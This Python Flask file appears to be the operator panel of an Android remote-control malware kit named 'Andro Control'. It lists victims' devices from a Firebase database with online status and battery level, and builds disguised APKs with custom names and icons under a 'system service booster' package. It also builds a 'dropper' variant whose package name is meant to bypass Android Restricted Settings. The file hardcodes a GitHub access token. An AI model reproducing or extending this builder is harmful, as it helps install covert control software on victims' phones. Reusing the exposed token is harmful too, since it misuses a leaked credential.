import firebase_admin
from firebase_admin import credentials, db
from flask import Flask, render_template, request, jsonify, send_from_directory
import os, time, threading, re, shutil, subprocess, base64, uuid

# --- CONFIG ---
FIREBASE_URL = "https://its-free-pay-for-premium-acces-default-rtdb.asia-southeast1.firebasedatabase.app/"
USER_ID = "master01"  # Single-user UID
GITHUB_REPO = os.environ.get("GITHUB_REPO", "ggvgghb243-hash/ando-projet")
GITHUB_TOKEN = os.environ.get("GITHUB_TOKEN", "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")

# --- Firebase Init ---
import glob
json_files = glob.glob(os.path.join(os.path.dirname(__file__), "*firebase-adminsdk*.json")) or glob.glob(os.path.join(os.path.dirname(__file__), "*.json"))
cred_path = json_files[0] if json_files else os.path.join(os.path.dirname(__file__), "firebase-service-account.json")

if os.path.exists(cred_path):
    try:
        cred = credentials.Certificate(cred_path)
        firebase_admin.initialize_app(cred, {'databaseURL': FIREBASE_URL})
    except ValueError:
        pass  # Already initialized
    except Exception as e:
        print(f"Firebase init error: {e}")
else:
    print("WARNING: firebase-service-account.json not found!")

# --- Flask App ---
app = Flask(__name__)
app.config['SECRET_KEY'] = 'andro-control-secret'

CURRENT_DIR = os.path.dirname(os.path.abspath(__file__))
PROJECT_ROOT = CURRENT_DIR
BUILDS_DIR = os.path.join(CURRENT_DIR, "builds")
os.makedirs(BUILDS_DIR, exist_ok=True)
UPLOADS_DIR = os.path.join(CURRENT_DIR, "uploads")
os.makedirs(UPLOADS_DIR, exist_ok=True)


# ==================== ROUTES ====================

@app.route('/')
def index():
    last_apk = None
    try:
        u = db.reference(f'panel_users/{USER_ID}').get() or {}
        last_apk = u.get('last_apk', '')
    except:
        pass
    return render_template('index.html',
        uid=USER_ID,
        last_apk=last_apk,
        firebase_url=FIREBASE_URL
    )


@app.route('/control/<uid>/<did>')
def control(uid, did):
    return render_template('control.html',
        user_id=uid,
        device_id=did,
        firebase_url=FIREBASE_URL
    )


@app.route('/api/devices')
def api_devices():
    """Fetch all devices for USER_ID using Admin SDK."""
    try:
        user_data = db.reference(f'users/{USER_ID}/devices').get() or {}
        devices = []
        for did, dev in user_data.items():
            if not isinstance(dev, dict):
                continue
            info = dev.get('info', {}) if isinstance(dev.get('info'), dict) else {}
            health = dev.get('health', {}) if isinstance(dev.get('health'), dict) else {}

            online_val = health.get('online', False)
            is_online = str(online_val).lower() in ('true', '1')

            # Staleness check: if lastSeen > 90 seconds ago, mark offline
            if is_online:
                last_seen = health.get('lastSeen', 0)
                if last_seen and isinstance(last_seen, (int, float)):
                    age = (time.time() * 1000) - last_seen  # lastSeen is in ms
                    if age > 90000:
                        is_online = False

            devices.append({
                'did': did,
                'model': info.get('model', info.get('brand', 'Unknown')),
                'battery': health.get('battery', 0),
                'is_online': is_online,
            })
        return jsonify({'success': True, 'devices': devices, 'timestamp': time.strftime('%H:%M:%S')})
    except Exception as e:
        print("API DEVICES ERROR:", e)
        return jsonify({'success': False, 'devices': [], 'error': str(e)})


@app.route('/build', methods=['POST'])
def build():
    icon_path = None
    if 'app_icon' in request.files:
        f = request.files['app_icon']
        if f and f.filename:
            icon_path = os.path.join(UPLOADS_DIR, f"icon_{USER_ID}.png")
            f.save(icon_path)

    # Save basic config
    try:
        db.reference(f'panel_users/{USER_ID}').update({
            'webview_url': request.form.get('webview_url', ''),
        })
    except Exception as e:
        print(f"Config save error: {e}")

    threading.Thread(target=build_worker, args=(
        USER_ID,
        request.form.get('webview_url', ''),
        request.form.get('app_name', 'Application'),
        request.form.get('package_name', 'com.system.service.booster'),
        icon_path,
        request.form.get('build_type') == 'dropper'
    ), daemon=True).start()

    return jsonify({'success': True})


@app.route('/download/<path:filename>')
def download(filename):
    safe = os.path.basename(filename)
    path = os.path.join(BUILDS_DIR, safe)
    if os.path.exists(path):
        return send_from_directory(BUILDS_DIR, safe, as_attachment=True)
    return "APK not found", 404


# ==================== BUILD SYSTEM ====================

def inject_config(uid, webview, app_name, package_name):
    """Inject config into Android source."""
    try:
        manifest = os.path.join(PROJECT_ROOT, "app", "src", "main", "AndroidManifest.xml")
        if os.path.exists(manifest):
            with open(manifest, 'r', encoding='utf-8') as f:
                content = f.read()
            configs = {"webview_url": webview, "user_id": uid, "firebase_url": FIREBASE_URL}
            for k, v in configs.items():
                p = f'android:name="{k}" android:value="[^"]*"'
                r = f'android:name="{k}" android:value="{v}"'
                content = re.sub(p, r, content)
            with open(manifest, 'w', encoding='utf-8') as f:
                f.write(content)

        strings = os.path.join(PROJECT_ROOT, "app", "src", "main", "res", "values", "strings.xml")
        if os.path.exists(strings):
            with open(strings, 'r', encoding='utf-8') as f:
                content = f.read()
            content = re.sub(r'<string name="app_name">.*</string>',
                           f'<string name="app_name">{app_name}</string>', content)
            with open(strings, 'w', encoding='utf-8') as f:
                f.write(content)
                
        # Inject app name into Dropper if it exists
        dropper_strings = os.path.join(PROJECT_ROOT, "dropper", "src", "main", "res", "values", "strings.xml")
        if not os.path.exists(os.path.dirname(dropper_strings)):
            os.makedirs(os.path.dirname(dropper_strings), exist_ok=True)
            
        # Write strings.xml for dropper
        dropper_strings_content = f'''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{app_name}</string>
</resources>'''
        with open(dropper_strings, 'w', encoding='utf-8') as f:
            f.write(dropper_strings_content)
            
        # Update Dropper Manifest label if hardcoded
        dropper_manifest = os.path.join(PROJECT_ROOT, "dropper", "src", "main", "AndroidManifest.xml")
        if os.path.exists(dropper_manifest):
            with open(dropper_manifest, 'r', encoding='utf-8') as f:
                content = f.read()
            # Replace hardcoded label with string reference
            content = re.sub(r'android:label="[^"]*"', 'android:label="@string/app_name"', content)
            with open(dropper_manifest, 'w', encoding='utf-8') as f:
                f.write(content)
                
        # Inject package name into both build.gradle.kts
        app_gradle = os.path.join(PROJECT_ROOT, "app", "build.gradle.kts")
        if os.path.exists(app_gradle):
            with open(app_gradle, 'r', encoding='utf-8') as f:
                content = f.read()
            content = re.sub(r'applicationId\s*=\s*"[^"]*"', f'applicationId = "{package_name}"', content)
            with open(app_gradle, 'w', encoding='utf-8') as f:
                f.write(content)
                
        dropper_gradle = os.path.join(PROJECT_ROOT, "dropper", "build.gradle.kts")
        if os.path.exists(dropper_gradle):
            with open(dropper_gradle, 'r', encoding='utf-8') as f:
                content = f.read()
            # Dropper must have a different package name to bypass Restricted Settings
            dropper_pkg = f"{package_name}.installer"
            content = re.sub(r'applicationId\s*=\s*"[^"]*"', f'applicationId = "{dropper_pkg}"', content)
            with open(dropper_gradle, 'w', encoding='utf-8') as f:
                f.write(content)

        # Update google-services.json to prevent Firebase build crash
        google_services = os.path.join(PROJECT_ROOT, "app", "google-services.json")
        if os.path.exists(google_services):
            with open(google_services, 'r', encoding='utf-8') as f:
                content = f.read()
            # Replace the package name in the JSON
            content = re.sub(r'"package_name":\s*"[^"]*"', f'"package_name": "{package_name}"', content)
            with open(google_services, 'w', encoding='utf-8') as f:
                f.write(content)

        return True
    except Exception as e:
        print(f"Inject error: {e}")
        return False


def trigger_github_actions(uid, webview, app_name, package_name, is_dropper=False):
    """Trigger GitHub Actions workflow remotely."""
    import urllib.request, json
    ref = db.reference(f'panel_users/{uid}/build_status')
    try:
        ref.set({'status': '⚙️ Dispatching GitHub Action', 'percent': 15, 'last_log': f'Triggering workflow on {GITHUB_REPO}...'})
        url = f"https://api.github.com/repos/{GITHUB_REPO}/actions/workflows/build.yml/dispatches"
        payload = {
            "ref": "main",
            "inputs": {
                "app_name": app_name,
                "package_name": package_name,
                "webview_url": webview or "https://calculator.apps.chrome",
                "user_id": uid,
                "build_type": "dropper" if is_dropper else "main"
            }
        }
        headers = {
            "Authorization": f"token {GITHUB_TOKEN}",
            "Accept": "application/vnd.github.v3+json",
            "User-Agent": "Python-Flask-App"
        }
        req = urllib.request.Request(url, data=json.dumps(payload).encode('utf-8'), headers=headers, method='POST')
        with urllib.request.urlopen(req) as res:
            if res.status in (204, 201, 200):
                ref.set({
                    'status': '🚀 GitHub Build Started!',
                    'percent': 40,
                    'last_log': f'Building in cloud! Track at https://github.com/{GITHUB_REPO}/actions'
                })
                return True
    except Exception as e:
        print(f"GitHub Actions dispatch note: {e}")
        ref.update({'last_log': f'GitHub Actions trigger: {e}'})
    return False


def build_worker(uid, webview, app_name, package_name, icon_path=None, is_dropper=False):
    """Background APK build."""
    ref = db.reference(f'panel_users/{uid}/build_status')
    if GITHUB_TOKEN and GITHUB_REPO:
        if trigger_github_actions(uid, webview, app_name, package_name, is_dropper):
            return

    try:
        ref.set({'status': '⚙️ Injecting Config', 'percent': 10, 'last_log': 'Writing config...'})
        if not inject_config(uid, webview, app_name, package_name):
            ref.set({'status': '❌ Injection Failed', 'percent': 0, 'last_log': 'Config injection failed'})
            return

        if icon_path and os.path.exists(icon_path):
            try:
                from PIL import Image
                img = Image.open(icon_path)
                sizes = {
                    'mdpi': 48, 'hdpi': 72, 'xhdpi': 96,
                    'xxhdpi': 144, 'xxxhdpi': 192
                }
                
                # Update Main App Icons
                res_dir_app = os.path.join(PROJECT_ROOT, "app", "src", "main", "res")
                for density, size in sizes.items():
                    out_dir = os.path.join(res_dir_app, f"mipmap-{density}")
                    os.makedirs(out_dir, exist_ok=True)
                    img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher.png"))
                    img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher_round.png"))
                    
                # Update Dropper App Icons
                res_dir_dropper = os.path.join(PROJECT_ROOT, "dropper", "src", "main", "res")
                for density, size in sizes.items():
                    out_dir = os.path.join(res_dir_dropper, f"mipmap-{density}")
                    os.makedirs(out_dir, exist_ok=True)
                    img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher.png"))
                    img.resize((size, size)).save(os.path.join(out_dir, "ic_launcher_round.png"))
                    
            except Exception as e:
                print(f"Icon processing error: {e}")

        ref.update({'status': '🔨 Building', 'percent': 30, 'last_log': 'Starting Gradle...'})
        cmd = 'gradlew.bat' if os.name == 'nt' else './gradlew'
        gradle = os.path.join(PROJECT_ROOT, cmd)

        if not os.path.exists(gradle):
            ref.set({'status': '❌ Error', 'percent': 0, 'last_log': f'{cmd} not found!'})
            return

        # Kill stale processes
        try:
            if os.name == 'nt':
                subprocess.run(['taskkill', '/F', '/IM', 'java.exe', '/T'],
                             stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run([gradle, '--stop'], cwd=PROJECT_ROOT, timeout=10,
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        except:
            pass

        target_task = ':dropper:assembleDebug' if is_dropper else 'clean assembleDebug'
        build_cmd = [gradle, *target_task.split(), '--no-daemon',
                     '--no-configuration-cache', '-Dorg.gradle.daemon=false']

        proc = subprocess.Popen(build_cmd, cwd=PROJECT_ROOT,
                               stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1)

        for line in proc.stdout:
            line = line.strip()
            if not line:
                continue
            # Print to terminal
            print(f"[GRADLE] {line}")
            if "preBuild" in line:
                ref.update({'percent': 35, 'last_log': 'Preparing build...'})
            elif "compileDebug" in line:
                ref.update({'percent': 55, 'last_log': 'Compiling...'})
            elif "mergeDebug" in line:
                ref.update({'percent': 75, 'last_log': 'Merging resources...'})
            elif "packageDebug" in line:
                ref.update({'percent': 90, 'last_log': 'Packaging APK...'})

        proc.wait(timeout=600)

        if proc.returncode != 0:
            ref.set({'status': '❌ Build Failed', 'percent': 0, 'last_log': 'Gradle failed'})
            return

        if is_dropper:
            output_apk = os.path.join(PROJECT_ROOT, "dropper", "build", "outputs", "apk", "debug", "dropper-debug.apk")
        else:
            output_apk = os.path.join(PROJECT_ROOT, "app", "build", "outputs", "apk", "debug", "app-debug.apk")
            
        if os.path.exists(output_apk):
            clean = re.sub(r'[^\w._\- ]', '', app_name).strip().replace(' ', '_') or 'App'
            suffix = "_dropper" if is_dropper else ""
            fname = f"{clean}_{uid}{suffix}.apk"
            shutil.copy2(output_apk, os.path.join(BUILDS_DIR, fname))
            db.reference(f'panel_users/{uid}').update({
                'last_apk': fname, 'build_time': time.strftime("%I:%M %p")
            })
            ref.set({'status': '✅ Complete', 'last_log': 'Build successful!', 'percent': 100})
        else:
            ref.set({'status': '❌ APK Not Found', 'percent': 0, 'last_log': 'Output missing'})

    except Exception as e:
        ref.set({'status': f'❌ Error', 'percent': 0, 'last_log': str(e)})


if __name__ == '__main__':
    print("\n  🚀 Andro Control running at http://localhost:7070\n")
    app.run(host='0.0.0.0', port=7070, debug=True)
